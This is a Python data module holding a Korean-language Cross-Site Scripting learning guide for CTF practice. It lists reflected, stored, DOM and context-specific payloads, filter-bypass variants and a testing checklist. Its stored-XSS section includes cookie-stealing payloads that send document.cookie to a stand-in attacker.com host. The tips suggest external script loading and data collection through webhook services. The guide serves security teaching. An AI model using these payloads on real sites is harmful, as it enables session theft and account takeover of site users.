"""Cross-Site Scripting (XSS) Learning Guide."""

XSS_GUIDE = {
    "attack_type": "xss",
    "title": "Cross-Site Scripting (XSS) Guide",
    "severity": "high",
    "difficulty": "beginner",

    "overview": """Cross-Site Scripting(XSS)은 웹 페이지에 악성 스크립트를 삽입하여 사용자의 브라우저에서 실행되게 하는 공격입니다.
공격자는 이를 통해 세션 쿠키 탈취, 키로깅, 피싱, 악성코드 배포 등을 수행할 수 있습니다.

XSS는 사용자 입력이 적절한 검증/인코딩 없이 HTML에 출력될 때 발생합니다.
Reflected, Stored, DOM-based 세 가지 유형이 있으며, 각각 다른 방식으로 공격합니다.""",

    "impact": [
        "세션 쿠키 탈취로 계정 장악 (Session Hijacking)",
        "키로깅을 통한 민감 정보 수집",
        "피싱 페이지로 리다이렉트",
        "브라우저 익스플로잇 배포",
        "웹사이트 변조 (Defacement)",
        "CSRF 공격 수행",
    ],

    "vulnerable_patterns": [
        "<div>Welcome, <?= $_GET['name'] ?></div>",
        "document.write(location.hash.substring(1))",
        "element.innerHTML = userInput;",
    ],

    "techniques": {
        "reflected": {
            "name": "Reflected XSS",
            "difficulty": "beginner",
            "how_it_works": """Reflected XSS는 악성 스크립트가 URL 파라미터 등에 포함되어, 서버 응답에 반사되어 실행됩니다.
피해자가 악성 링크를 클릭해야 공격이 성립합니다.
주로 검색 결과, 에러 메시지, 사용자 입력 에코 페이지에서 발견됩니다.""",
            "prerequisites": [
                "사용자 입력이 응답 HTML에 포함됨",
                "적절한 출력 인코딩이 없음",
            ],
            "payloads": [
                {"payload": "<script>alert(1)</script>", "purpose": "기본 스크립트 삽입", "expected": "Alert 팝업"},
                {"payload": "<img src=x onerror=alert(1)>", "purpose": "이벤트 핸들러 이용", "expected": "Alert 팝업"},
                {"payload": "<svg onload=alert(1)>", "purpose": "SVG 태그 이용", "expected": "Alert 팝업"},
                {"payload": "javascript:alert(1)", "purpose": "href 속성에 삽입", "expected": "클릭 시 Alert"},
            ],
            "detection_patterns": [
                "입력값이 그대로 응답에 포함됨",
                "특수문자(<, >, \", ')가 인코딩되지 않음",
            ],
            "common_mistakes": [
                "alert만 테스트하고 끝냄 - 실제 쿠키 탈취 PoC 필요",
                "브라우저 XSS 필터에 의해 차단될 수 있음",
            ],
        },

        "stored": {
            "name": "Stored XSS",
            "difficulty": "intermediate",
            "how_it_works": """Stored XSS는 악성 스크립트가 서버에 저장되어, 해당 페이지를 방문하는 모든 사용자에게 영향을 미칩니다.
게시판, 댓글, 프로필, 메시지 기능 등에서 주로 발견됩니다.
한 번 저장되면 지속적으로 공격이 수행되어 위험성이 높습니다.""",
            "prerequisites": [
                "사용자 입력이 DB에 저장됨",
                "저장된 데이터가 다른 사용자에게 표시됨",
            ],
            "payloads": [
                {"payload": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", "purpose": "쿠키 탈취", "expected": "쿠키가 공격자 서버로 전송"},
                {"payload": "<img src=x onerror=\"fetch('http://attacker.com/?'+document.cookie)\">", "purpose": "Fetch API 쿠키 탈취", "expected": "쿠키 전송"},
            ],
            "detection_patterns": [
                "저장된 콘텐츠에서 스크립트 실행됨",
                "다른 사용자 브라우저에서도 실행됨",
            ],
            "common_mistakes": [
                "게시글만 테스트 - 프로필, 닉네임, 파일명 등도 확인",
                "XSS가 작동해도 HttpOnly 쿠키는 탈취 불가",
            ],
        },

        "dom_based": {
            "name": "DOM-Based XSS",
            "difficulty": "intermediate",
            "how_it_works": """DOM XSS는 클라이언트 측 JavaScript가 사용자 입력을 안전하지 않게 처리할 때 발생합니다.
서버를 거치지 않고 브라우저에서만 발생하므로 서버 로그에 남지 않습니다.
location.hash, location.search, document.referrer 등이 주요 소스입니다.""",
            "prerequisites": [
                "JavaScript가 URL 파라미터나 해시를 DOM에 삽입",
                "innerHTML, document.write 등 위험한 싱크 사용",
            ],
            "payloads": [
                {"payload": "#<img src=x onerror=alert(1)>", "purpose": "location.hash 이용", "expected": "Alert 팝업"},
                {"payload": "?default=<script>alert(1)</script>", "purpose": "URL 파라미터 이용", "expected": "Alert 팝업"},
            ],
            "detection_patterns": [
                "페이지 소스에는 없지만 DOM에서 스크립트 발견",
                "JavaScript 소스에서 eval, innerHTML, document.write 사용",
            ],
            "common_mistakes": [
                "소스 코드만 보고 없다고 판단 - 실제 DOM 검사 필요",
                "SPA에서 흔히 발생 - React/Vue dangerouslySetInnerHTML 확인",
            ],
        },

        "attribute_context": {
            "name": "Attribute Context XSS",
            "difficulty": "intermediate",
            "how_it_works": """HTML 속성 내에 삽입될 때, 속성을 탈출하여 이벤트 핸들러를 추가합니다.
value, href, src, style 등의 속성 값에 입력이 반영될 때 시도합니다.""",
            "prerequisites": [
                "입력이 HTML 속성 값으로 사용됨",
            ],
            "payloads": [
                {"payload": "\" onmouseover=\"alert(1)", "purpose": "이벤트 핸들러 추가", "expected": "마우스 오버 시 Alert"},
                {"payload": "' onfocus='alert(1)' autofocus='", "purpose": "autofocus 이용", "expected": "페이지 로드 시 Alert"},
                {"payload": "javascript:alert(1)//", "purpose": "href 속성용", "expected": "클릭 시 Alert"},
            ],
            "detection_patterns": [
                "입력이 속성 값에 포함됨",
                "따옴표 이스케이프가 없음",
            ],
            "common_mistakes": [
                "이벤트 핸들러가 차단될 수 있음 - 다양한 이벤트 시도",
            ],
        },

        "javascript_context": {
            "name": "JavaScript Context XSS",
            "difficulty": "advanced",
            "how_it_works": """입력이 JavaScript 코드 내에 삽입될 때, 문자열을 탈출하여 임의 코드를 실행합니다.
주로 인라인 스크립트 블록 내에서 변수 할당에 사용될 때 발생합니다.""",
            "prerequisites": [
                "입력이 <script> 블록 내 JavaScript 코드에 포함됨",
            ],
            "payloads": [
                {"payload": "'-alert(1)-'", "purpose": "문자열 탈출", "expected": "Alert 실행"},
                {"payload": "';alert(1)//", "purpose": "문장 종료 후 실행", "expected": "Alert 실행"},
                {"payload": "</script><script>alert(1)</script>", "purpose": "스크립트 블록 탈출", "expected": "Alert 실행"},
            ],
            "detection_patterns": [
                "입력이 JavaScript 변수에 할당됨",
                "싱글/더블 쿼트 이스케이프 없음",
            ],
            "common_mistakes": [
                r"\', \" 이스케이프만 있으면 </script>로 탈출 가능",
            ],
        },
    },

    "checklist": [
        {
            "step": 1,
            "action": "입력/출력 포인트 매핑",
            "expected_result": "입력이 출력되는 모든 위치 파악",
            "command_example": "ctf-toolkit xss scan -u 'http://target.com?q=test'",
            "notes": "검색, 에러 메시지, 프로필, 댓글 등"
        },
        {
            "step": 2,
            "action": "출력 컨텍스트 확인",
            "expected_result": "HTML, 속성, JavaScript, URL 중 어디에 출력되는지",
            "command_example": None,
            "notes": "각 컨텍스트별로 다른 페이로드 필요"
        },
        {
            "step": 3,
            "action": "기본 XSS 페이로드 테스트",
            "expected_result": "스크립트 실행 여부",
            "command_example": None,
            "notes": "<script>alert(1)</script>, <img src=x onerror=alert(1)>"
        },
        {
            "step": 4,
            "action": "필터링 확인",
            "expected_result": "차단되는 키워드/패턴 파악",
            "command_example": None,
            "notes": "script, on*, javascript 등"
        },
        {
            "step": 5,
            "action": "우회 페이로드 시도",
            "expected_result": "필터 우회 성공",
            "command_example": None,
            "notes": "대소문자, 인코딩, 태그 변형 등"
        },
        {
            "step": 6,
            "action": "DOM XSS 확인",
            "expected_result": "클라이언트 측 XSS 발견",
            "command_example": None,
            "notes": "JavaScript 소스 분석, 해시/파라미터 처리 확인"
        },
        {
            "step": 7,
            "action": "Stored XSS 테스트",
            "expected_result": "저장된 페이로드 실행",
            "command_example": None,
            "notes": "게시글, 댓글, 프로필 등에 저장 후 확인"
        },
        {
            "step": 8,
            "action": "쿠키 탈취 PoC 작성",
            "expected_result": "실제 공격 시나리오 증명",
            "command_example": None,
            "notes": "HttpOnly 쿠키 여부 확인 필수"
        },
    ],

    "detection_patterns": [
        {
            "pattern_type": "behavior",
            "indicator": "입력값이 HTML에 그대로 출력됨",
            "confidence": "high",
            "db_specific": None,
            "example_response": "<p>Search results for: <script>alert(1)</script></p>"
        },
        {
            "pattern_type": "behavior",
            "indicator": "Alert 팝업 또는 콘솔 메시지 출력",
            "confidence": "high",
            "db_specific": None,
            "example_response": None
        },
        {
            "pattern_type": "behavior",
            "indicator": "특수문자 (<, >, \", ')가 인코딩되지 않음",
            "confidence": "high",
            "db_specific": None,
            "example_response": "value=\"test\" onmouseover=\"alert(1)\""
        },
        {
            "pattern_type": "behavior",
            "indicator": "Content-Type이 text/html이고 X-XSS-Protection 없음",
            "confidence": "medium",
            "db_specific": None,
            "example_response": None
        },
    ],

    "waf_bypass": [
        {
            "technique": "대소문자 혼합",
            "example": "<ScRiPt>alert(1)</sCrIpT>",
            "effective_against": "Case-sensitive filters"
        },
        {
            "technique": "이벤트 핸들러 변형",
            "example": "<body/onload=alert(1)>",
            "effective_against": "Space filters"
        },
        {
            "technique": "HTML 인코딩",
            "example": "&lt;script&gt; → <script>",
            "effective_against": "Basic sanitization"
        },
        {
            "technique": "유니코드 인코딩",
            "example": "\\u003cscript\\u003e",
            "effective_against": "JavaScript context"
        },
        {
            "technique": "더블 인코딩",
            "example": "%253Cscript%253E",
            "effective_against": "Single-decode filters"
        },
        {
            "technique": "Null 바이트",
            "example": "<scr%00ipt>",
            "effective_against": "String matching filters"
        },
    ],

    "ctf_tips": [
        "<script>alert(document.domain)</script>로 도메인 확인",
        "필터링 시 <svg/onload=alert(1)> 또는 <img src=x onerror=alert(1)>",
        "innerHTML 대신 innerText 사용 권장 (방어 측)",
        "document.cookie로 쿠키 확인, HttpOnly 시 다른 공격 경로",
        "CSP 헤더 확인 - script-src가 있으면 인라인 스크립트 제한될 수 있음",
        "Stored XSS는 관리자 페이지를 타겟으로 권한 상승 시도",
        "길이 제한 시 외부 스크립트 로드: <script src=//xss.js>",
        "webhook.site, requestbin.com으로 데이터 수신 확인",
        "DOM XSS는 sources(입력)와 sinks(실행) 분석 필수",
    ],
}
